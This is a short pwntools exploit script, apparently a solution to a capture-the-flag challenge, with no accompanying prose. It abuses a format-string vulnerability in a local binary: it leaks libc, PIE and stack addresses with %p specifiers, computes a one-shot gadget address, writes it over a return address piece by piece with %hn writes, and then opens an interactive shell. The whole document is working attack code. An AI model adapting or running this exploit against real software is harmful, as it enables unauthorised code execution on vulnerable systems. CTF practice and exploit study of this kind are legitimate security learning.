from pwn import*
#p = remote('ha1cyon-ctf.fun',30196)
p = process('./main')
libc= ELF('./libc-2.27.so')
payload = 'LIBC:%7$p' + 'PIE:%6$p' + 'Stack:%9$p'
p.send(payload)
p.recvuntil('LIBC:')
libc_base = int(p.recv(14),16) - libc.sym['__libc_start_main'] -231
log.info('LIBC:\t' + hex(libc_base))
p.recvuntil('PIE:')
pie = int(p.recv(14),16) - 0x830
log.info('PIE:\t' + hex(pie))
p.recvuntil('Stack:')
stack = int(p.recv(14),16) - 232
log.info('Stack:\t' + hex(stack))
rce = libc_base + 0x10A38C
offset = stack&0xFFFF
off_1 = rce&0xFFFF
off_2=(rce>>16)&0xFFFF
off_3=(rce>>32)&0xFFFF

payload  ='%' + str(offset+8) + 'c' +'%9$hnFMYY\x00'
p.sendline(payload)
p.recvuntil('FMYY')
payload  ='%' + str(off_1) + 'c' +'%35$hnFMYY\x00'
p.sendline(payload)
p.recvuntil('FMYY')
payload  ='%' + str(offset+10) + 'c' +'%9$hnFMYY\x00'
p.sendline(payload)
p.recvuntil('FMYY')
payload  ='%' + str(off_2) + 'c' +'%35$hnFMYY\x00'
p.sendline(payload)
p.recvuntil('FMYY')
p.sendline('66666666\x00')
p.interactive()
